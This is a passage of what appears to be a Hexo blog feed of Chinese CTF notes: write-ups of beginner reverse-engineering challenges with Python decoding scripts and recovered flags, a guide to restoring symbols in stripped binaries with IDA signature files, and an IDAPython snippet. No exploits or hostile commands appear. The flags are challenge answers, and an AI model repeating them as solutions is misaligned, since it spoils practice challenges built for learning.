class="meta">&gt;&gt;&gt; </span><span class="number">170</span>-ord(<span class="string">'q'</span>)</span><br><span class="line"><span class="number">57</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">57</span>)</span><br><span class="line"><span class="string">'9'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">155</span>-ord(<span class="string">'9'</span>)</span><br><span class="line"><span class="number">98</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">98</span>)</span><br><span class="line"><span class="string">'b'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(<span class="number">155</span>-ord(<span class="string">'Z'</span>))</span><br><span class="line"><span class="string">'A'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">'CZ9dmq4c8g9G7bAX'</span>)</span><br><span class="line"><span class="number">16</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>CZ9dmq4c8g9G7bAX</p><h2 id="re11"><a href="#re11" class="headerlink" title="re11"></a>re11</h2><p>sub_401000里的</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( v18 &amp;&amp; *v19 &gt;= v13 )</span><br><span class="line">&#123;</span><br><span class="line">  v21 = <span class="number">3</span>;</span><br><span class="line">  v14 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; v5; --v5 )</span><br><span class="line">  &#123;</span><br><span class="line">    v15 = *v7;</span><br><span class="line">    <span class="keyword">if</span> ( *v7 != <span class="string">'\r'</span> &amp;&amp; v15 != <span class="string">'\n'</span> &amp;&amp; v15 != <span class="string">' '</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v16 = byte_414E40[v15];</span><br><span class="line">      v21 -= v16 == <span class="number">64</span>;</span><br><span class="line">      v14 = v16 &amp; <span class="number">0x3F</span> | (v14 &lt;&lt; <span class="number">6</span>);</span><br><span class="line">      <span class="keyword">if</span> ( ++i == <span class="number">4</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        i = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">if</span> ( v21 )</span><br><span class="line">          *v12++ = BYTE2(v14);</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt; <span class="number">1</span> )</span><br><span class="line">          *v12++ = BYTE1(v14);</span><br><span class="line">        <span class="keyword">if</span> ( v21 &gt; <span class="number">2</span> )</span><br><span class="line">          *v12++ = v14;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ++v7;</span><br><span class="line">  &#125;</span><br><span class="line">  *v19 = v12 - v18;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里看出是base64decode</p><p>后面在来一顿异或</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">for</span> ( ; v4 &lt; v3; ++v4 )</span><br><span class="line">  *(&amp;v13 + v4) ^= <span class="number">0x25</span>u;</span><br></pre></td></tr></table></figure><p>所以解密，异或回去，在base64encode<br>中间一顿操作你会发觉他根本没操作你的输入</p><p>XEpQek5LSlJ6TUpSelFKeldASEpTQHpPUEtOekZKQUA=</p><h2 id="re12"><a href="#re12" class="headerlink" title="re12"></a>re12</h2><p>又是一道简单题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line"></span><br><span class="line">List = [<span class="number">0x0D</span>, <span class="number">0x13</span>, <span class="number">0x17</span>, <span class="number">0x11</span>, <span class="number">0x02</span>, <span class="number">0x01</span>, <span class="number">0x20</span>, <span class="number">0x1D</span>, <span class="number">0x0C</span>, <span class="number">0x02</span>, <span class="number">0x19</span>, <span class="number">0x2F</span>, <span class="number">0x17</span>, <span class="number">0x2B</span>, <span class="number">0x24</span>, <span class="number">0x1F</span>, <span class="number">0x1E</span>, <span class="number">0x16</span>, <span class="number">0x09</span>, <span class="number">0x0F</span>, <span class="number">0x15</span>, <span class="number">0x27</span>, <span class="number">0x13</span>, <span class="number">0x26</span>, <span class="number">0x0A</span>, <span class="number">0x2F</span>, <span class="number">0x1E</span>, <span class="number">0x1A</span>, <span class="number">0x2D</span>, <span class="number">0x0C</span>, <span class="number">0x22</span>, <span class="number">0x4</span>]</span><br><span class="line">string = <span class="string">"GONDPHyGjPEKruv&#123;&#123;pj]X@rF"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    first = ord(string[i])^List[i]</span><br><span class="line">    second = (first<span class="number">-72</span>) ^ <span class="number">0x55</span> </span><br><span class="line">    <span class="keyword">if</span> second &gt;=<span class="number">97</span> <span class="keyword">and</span> second &lt;=<span class="number">122</span>:</span><br><span class="line">        second -= <span class="number">32</span></span><br><span class="line">    <span class="keyword">elif</span> second &gt;=<span class="number">65</span> <span class="keyword">and</span> second &lt;=<span class="number">90</span>:</span><br><span class="line">        second += <span class="number">32</span></span><br><span class="line"></span><br><span class="line">    flag += chr(second)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">print(<span class="string">"EIS&#123;"</span> + flag + <span class="string">"&#125;"</span>)</span><br><span class="line"><span class="comment">#EIS&#123;wadx_tdgk_aihc_ihkn_pjlm&#125;</span></span><br></pre></td></tr></table></figure><h2 id="re13"><a href="#re13" class="headerlink" title="re13"></a>re13</h2><p>算法简单，不挣扎了，手动写下出来了</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'D'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'C'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'p'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'o'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'e'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'d'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'f'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'`'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'_'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'U'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'T'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'b'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'a'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'m'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'l'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'l'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'k'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'f'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'e'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'s'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'r'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>chr(ord(<span class="string">'t'</span>)<span class="number">-1</span>)</span><br><span class="line"><span class="string">'s'</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>Code_Talkers</span><br></pre></td></tr></table></figure><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/c8f4b23e/">https://noone-hub.github.io/posts/c8f4b23e/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>bin</category>
        <category>逆向</category>
      </categories>
  </entry>
  <entry>
    <title>恢复静态编译去符号</title>
    <url>/posts/fea8bac7/</url>
    <content><![CDATA[<h1 id="ida-pro恢复去符号程序的符号"><a href="#ida-pro恢复去符号程序的符号" class="headerlink" title="ida pro恢复去符号程序的符号"></a>ida pro恢复去符号程序的符号</h1><h2 id="序言"><a href="#序言" class="headerlink" title="序言"></a>序言</h2><p>第一部分说的都是废话吧，对我来说，建议用后面部分的</p><h2 id="恢复方法"><a href="#恢复方法" class="headerlink" title="恢复方法"></a>恢复方法</h2><h3 id="lscanf"><a href="#lscanf" class="headerlink" title="lscanf"></a>lscanf</h3><p>首先获得sig,我这里用的是lscanf里的sig</p><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL21hcm91ZW5lYm91YmFrcmkvbHNjYW4=" title="https://github.com/maroueneboubakri/lscan">下载地址<i class="fa fa-external-link"></i></span></p><p>先扫描下</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">python lscan.py -f stripped -S amd64/sig/</span><br><span class="line">amd64/sig/libc-2.13.sig 12266/3369 (364.08%)</span><br><span class="line">amd64/sig/libc-2.22.sig 12870/2859 (450.16%)</span><br><span class="line">amd64/sig/libc-2.23.sig 13163/2869 (458.80%)</span><br><span class="line">amd64/sig/libcrypto-1.0.2h.sig 36850/5057 (728.69%)</span><br><span class="line">amd64/sig/libm-2.13.sig 11125/445 (2500.00%)</span><br><span class="line">amd64/sig/libm-2.22.sig 11121/582 (1910.82%)</span><br><span class="line">amd64/sig/libm-2.23.sig 11124/600 (1854.00%)</span><br><span class="line">amd64/sig/libpcre-8.38.sig 18/150 (12.00%)</span><br><span class="line">amd64/sig/libpthread-2.13.sig 11379/319 (3567.08%)</span><br><span class="line">amd64/sig/libpthread-2.22.sig 11159/262 (4259.16%)</span><br><span class="line">amd64/sig/libpthread-2.23.sig 11160/258 (4325.58%)</span><br><span class="line">amd64/sig/libssl-1.0.2h.sig 0/665 (0.00%)</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p>对比下符号哪个版本最匹配，这里显示是libm-2.13是最高的</p><p>到目录下移动libm-2.13.sig到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</p><p>emm，这个lscan 有点坑，我跑起来会卡死我机子，算了删了，手动尝试吧，下个sig database</p><h3 id="sig-database"><a href="#sig-database" class="headerlink" title="sig-database"></a>sig-database</h3><p><span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3B1c2gwZWJwL3NpZy1kYXRhYmFzZQ==" title="https://github.com/push0ebp/sig-database">sig-database<i class="fa fa-external-link"></i></span></p><p>file-&gt;Load file-&gt;flirt signature file</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117205629.png" alt></p><p>或者shift+f5<br><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117205744.png" alt></p><h3 id="重要的事情"><a href="#重要的事情" class="headerlink" title="重要的事情"></a>重要的事情</h3><p><strong>将.sig移动到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</strong><br><strong>将.sig移动到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</strong><br><strong>将.sig移动到IDA pro的安装目录下的sig文件夹下的pc目录下(大坑，网上都说是sig目录下，放到那完全没用,对我来说)</strong></p><h2 id="红帽杯-2019-three"><a href="#红帽杯-2019-three" class="headerlink" title="红帽杯 2019 three"></a>红帽杯 2019 three</h2><p>这道题也是去除了符号表的</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220250.png" alt></p><p>经尝试好多次后，发觉这个最符合，<br>libc6_2.27-0ubuntu2_i386 Applied 460 ubuntu 18.04 libc6 (2.27-0ubuntu2/i386)</p><p>看下恢复符号后</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220354.png" alt></p><p>恢复符号前</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220453.png" alt></p><p>好明显的对比，太强了</p><h2 id="湖湘杯-HackNote"><a href="#湖湘杯-HackNote" class="headerlink" title="湖湘杯 HackNote"></a>湖湘杯 HackNote</h2><p>这个最匹配的库</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117220901.png" alt></p><p>libc6_2.23-0ubuntu10_amd64 Applied 671 ubuntu 16.04 libc6 (2.23-0ubuntu10/amd64)</p><p>多么好看的场景</p><p><img src="https://raw.githubusercontent.com/NoOne-hub/picture/master/img/20191117221018.png" alt></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>静态去符号的题目最近做了好几道，总结下这种方法，避免以后再次遇到</p><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/fea8bac7/">https://noone-hub.github.io/posts/fea8bac7/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>idapython</title>
    <url>/posts/7abfd35a/</url>
    <content><![CDATA[<h1 id="idapython-学习"><a href="#idapython-学习" class="headerlink" title="idapython 学习"></a>idapython 学习</h1><p>第一个idapython脚本取数据</p><table><thead><tr><th>代码</th><th>备注</th></tr></thead><tbody><tr><td>idc.NextHead</td><td>获得下一条指令首地址</td></tr><tr><td>idc.PreHead</td><td>获得上一条指令首地址</td></tr><tr><td>GetOpnd</td><td>获得mov esi,1 mov后面的</td></tr><tr><td>GetMnem</td><td>获得mov esi,1 mov</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getList</span><span class="params">(start,end)</span>:</span></span><br><span class="line">    List = []</span><br><span class="line">    <span class="keyword">while</span> start &lt;= end:</span><br><span class="line">        next = idc.NextHead(start) <span class="comment">#取下一条指令</span></span><br><span class="line">        result = int(GetOpnd(start,<span class="number">1</span>)[:<span class="number">-1</span>],<span class="number">16</span>) <span class="comment"># 取mov esi,1的1</span></span><br><span class="line">        <span class="comment"># GetMnem(0x4007e1) 取mov esi,1 的mov</span></span><br><span class="line">        List.append(result)</span><br><span class="line">        start = next</span><br><span class="line">    <span class="keyword">return</span> List</span><br><span class="line"></span><br><span class="line">print(getList(<span class="number">0x4007e1</span>, <span class="number">0x400851</span>))</span><br></pre></td></tr></table></figure><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><p><strong>本文作者</strong>：NoOne<br><strong>本文地址</strong>： <a href="https://noone-hub.github.io/posts/7abfd35a/">https://noone-hub.github.io/posts/7abfd35a/</a><br><strong>版权声明</strong>：转载请注明出处！</p><!-- rebuild by neat -->]]></content>
      <categories>
        <category>基础</category>
      </categories>
  </entry>
  <entry>
    <title>cve-2010-3333</title>
    <url>/posts/d527976b/</url>
    <content><![CDATA[<div id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <div class="hbe-input-container">
  <input type="password" id="hbePass" placeholder="请输入密码以阅读这篇私密文章。">
    <label for="hbePass">请输入密码以阅读这篇私密文章。</label>
    <div class="bottom-line"></div>
  </div>
  <script id="hbeData" type="hbeData" data-hmacdigest="d5837eda300f067a55f52fe21fabd6dfb8960d8911feb9e89748b6a7098f8dc9">88297ae6ef5b1754b8d7392e09a2f26d86877fff9b510e30cfb7764df338a9bfc8fbe3eeed9def62979b145137f94bcb32de59dc63d31d66886a3a791277618c6ddf499447ec7eea876f45707920a5551ec03fe8517740bebbbd28ced5e4e2982991573a434f722242cf87b65f335b0656cc23083a6f8ac9a7998a43a91290f7f1c90cf582bbad4650034d76f66b061569e1d71e71bc1827d30c9d4be409c412f35e8df50c6495439a15c305b102c987e4dcc695e351b4604352f1d062a8955d2c5e5e756d8ab13d7ae5e8134c5a0853e5a78ca2b633afbcf2216bf793611ef838b7a16b802e7a05ec6d8a0273582316833158fa5bfb2fc5cdd1e22e5d52da2369d85f9325bc0c33e71f3a67b586b64b97d53dd37594bd777dc491ef05777ecd34237f16f82bf5db5f48e38c1135fe5bfeea8a1d2d91adeadab16af26728fb01bac9d45e82b546c519485ed0a2a9b9de20ef05f8b3b26c3a3f7cecb620ec4af7eae5b1a45f560453a234fd4b84778b79b3ad1a407e3cc2affbd122416b929b6d299579313fc5e1fa59468180a580d772982bb6b40c85b0356c3e5aa8c4a24ad0482de704c6507fac924fe898b13f6790d8a80a9eeda10d9e5b2a8fff0039e73d4de246baacecf1db7582c7966e85783b95c79a76011eb2898cd3f0bab28efb87982402b514ac078f2a71e58810a36849051a430cab142c102697c7e6665890086f8f51647d6732edfd39a43016177fc5408c07fdcf870c62453cc21f4f3438f2e8f898f811d9db394099aeb87837b40525f2a474a701cdcc1678979ae92d277c1c9a93ff2549018b60b275153c022757d49184398d4002003d7026be52a1d140342e7aa13d4659ee2c6476fd18eb2f76c7d383dcd6d172cee82d17fab60e5f58027ca33c99444e5c6498f79a91c79d052c800cf2bd204a89f2804f6d64f261ebbcbbadc602c67f27084eec30943bc44bf58cab3cf23c79a315014f723b475eb80b482eddca3e592bc9052b8db6cd08d607e167c3c00e6e461976dbbd3ddfd821c43a955292846198132e95d91ff24530bd36390db0525fda61abcbe3c1432b180c0fefe1102ca2115080c7d7ad35ce1ff1961dd71b165451840f52b0a51d05e26d34b4473f141a6cfa3d7f7276f165e5be18def4001a4a2710b1961706b6765e155dc79c6262c43c38a4d6a1e0c73d5ce0ac83b790541d801551931aa6e7bb4c98e740b33f08cc618c8134a091683a79</script>
</div>
<script src="/lib/blog-encrypt.js"></script><link href="/css/blog-encrypt.css" rel="stylesheet" type="text/css">]]></content>
      <categories>
        <category>bin</category>
        <category>pwn</category>
        <category>实战</category>
      </categories>
  </entry>
  <entry>
    <title>攻防世界新手区re</title>
    <url>/posts/ff286fcb/</url>
    <content><![CDATA[<h1 id="re题目新手区练习"><a href="#re题目新手区练习" class="headerlink" title="re题目新手区练习"></a>re题目新手区练习</h1><h2 id="re1"><a href="#re1" class="headerlink" title="re1"></a>re1</h2><p>od打开字符串搜一下。<br>DUTCTF{We1c0met0DUTCTF}</p><h2 id="re2"><a href="#re2" class="headerlink" title="re2"></a>re2</h2><p>随便乱输一下<br>zsctf{T9is_tOpic_1s_v5ry_int7resting_b6t_others_are_n0t}</p><p>emm，实质就是比较灯。这里没有算法，直接全nop就行了</p><h2 id="re3"><a href="#re3" class="headerlink" title="re3"></a>re3</h2><p>将输入的转为16进制与已知16进制串对比</p><a id="more"></a><!-- build time:Sat Dec 28 2019 22:32:14 GMT+0800 (China Standard Time) --><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line">string = <span class="string">"437261636b4d654a757374466f7246756e"</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(string), <span class="number">2</span>):</span><br><span class="line">    flag += chr(int(string[i:i+<span class="number">2</span>], <span class="number">16</span>))</span><br><span class="line"></span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment">#CrackMeJustForFun</span></span><br></pre></td></tr></table></figure><h2 id="re4"><a href="#re4" class="headerlink" title="re4"></a>re4</h2><ol><li>第一段输入0xcafe</li><li>第二段为就是8</li><li>第三段为h4cky0u</li><li>第四段 first * 31337 + (second % 17) * 11 + strlen(argv[3]) - 1615810207;</li></ol><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0xcafe</span></span><br><span class="line"><span class="number">51966</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">8</span>*<span class="number">25</span></span><br><span class="line"><span class="number">200</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">51966</span>*<span class="number">31337</span> + <span class="number">8</span>*<span class="number">11</span> + <span class="number">7</span> - <span class="number">1615810207</span></span><br><span class="line"><span class="number">12648430</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>hex(<span class="number">12648430</span>)</span><br><span class="line"><span class="string">'0xc0ffee'</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><p>第一次带了0x没提交上。。</p><h2 id="re5"><a href="#re5" class="headerlink" title="re5"></a>re5</h2><p>upx -d 脱掉壳就拿到flag了。。</p><p>flag{Upx_1s_n0t_a_d3liv3r_c0mp4ny}</p><h2 id="re6"><a href="#re6" class="headerlink" title="re6"></a>re6</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>len(<span class="string">':\"AL_RT^L*.?+6/46'</span>)</span><br><span class="line"><span class="number">17</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">v7 = hex(<span class="number">0x65626D61726168</span>)[<span class="number">2</span>:]</span><br><span class="line">v7 = [int(v7[i:i+<span class="number">2</span>], <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, len(v7), <span class="number">2</span>) ][::<span class="number">-1</span>]</span><br><span class="line">string = <span class="string">':\"AL_RT^L*.?+6/46'</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(string)):</span><br><span class="line">    first = v7[i % <span class="number">7</span>]</span><br><span class="line">    second = ord(string[i]) ^ first</span><br><span class="line">    flag += chr(second)</span><br><span class="line">print(flag)</span><br><span class="line"><span class="comment"># RC3-2016-XORISGUD</span></span><br></pre></td></tr></table></figure><p>坑点，小端序列，我转成int后忘了倒序，一直是错的。。</p><h2 id="re7"><a href="#re7" class="headerlink" title="re7"></a>re7</h2><p>???<br>9447{This_is_a_flag}</p><h2 id="re8"><a href="#re8" class="headerlink" title="re8"></a>re8</h2><p>python写个算法跑一下</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># coding=utf-8</span></span><br><span class="line">List1 = [<span class="number">0x3A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x36</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x37</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x3B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x63</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x66</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x67</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x62</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x65</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x60</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x71</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x70</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x64</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6E</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x76</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x78</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x6A</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x73</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x7B</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x80</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line">List2 = [<span class="number">0x01</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x02</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x03</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x04</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>, <span class="number">0x05</span>, <span class="number">0x14</span>, <span class="number">0x00</span>, <span class="number">0x00</span>]</span><br><span class="line"></span><br><span class="line">v6 = len(List1)</span><br><span class="line">v4 = <span class="number">0</span></span><br><span class="line">v7 = len(List2)</span><br><span class="line"><span class="keyword">while</span>(v4 &lt; v6):</span><br><span class="line">    List1[v4] -= List2[v4%v7]</span><br><span class="line">    v4 += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">List1 = [i <span class="keyword">for</span> i <span class="keyword">in</span> List1 <span class="keyword">if</span> i!= <span class="number">0</span>][:<span class="number">-2</span>]</span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> List1:</span><br><span class="line">    flag += chr(i)</span><br><span class="line">    print(flag)</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">9</span><br><span class="line">94</span><br><span class="line">944</span><br><span class="line">9447</span><br><span class="line">9447&#123;</span><br><span class="line">9447&#123;y</span><br><span class="line">9447&#123;yo</span><br><span class="line">9447&#123;you</span><br><span class="line">9447&#123;you_</span><br><span class="line">9447&#123;you_a</span><br><span class="line">9447&#123;you_ar</span><br><span class="line">9447&#123;you_are</span><br><span class="line">9447&#123;you_are_</span><br><span class="line">9447&#123;you_are_a</span><br><span class="line">9447&#123;you_are_an</span><br><span class="line">9447&#123;you_are_an_</span><br><span class="line">9447&#123;you_are_an_i</span><br><span class="line">9447&#123;you_are_an_in</span><br><span class="line">9447&#123;you_are_an_int</span><br><span class="line">9447&#123;you_are_an_inte</span><br><span class="line">9447&#123;you_are_an_inter</span><br><span class="line">9447&#123;you_are_an_intern</span><br><span class="line">9447&#123;you_are_an_interna</span><br><span class="line">9447&#123;you_are_an_internat</span><br><span class="line">9447&#123;you_are_an_internati</span><br><span class="line">9447&#123;you_are_an_internatio</span><br><span class="line">9447&#123;you_are_an_internation</span><br><span class="line">9447&#123;you_are_an_internationa</span><br><span class="line">9447&#123;you_are_an_international</span><br><span class="line">9447&#123;you_are_an_international_</span><br><span class="line">9447&#123;you_are_an_international_m</span><br><span class="line">9447&#123;you_are_an_international_my</span><br><span class="line">9447&#123;you_are_an_international_mys</span><br><span class="line">9447&#123;you_are_an_international_myst</span><br><span class="line">9447&#123;you_are_an_international_myste</span><br><span class="line">9447&#123;you_are_an_international_myster</span><br><span class="line">9447&#123;you_are_an_international_mystery</span><br><span class="line">9447&#123;you_are_an_international_mystery&#125;</span><br></pre></td></tr></table></figure><h2 id="re9"><a href="#re9" class="headerlink" title="re9"></a>re9</h2><p>看下算法，跑下就行了，还是小端序问题</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># 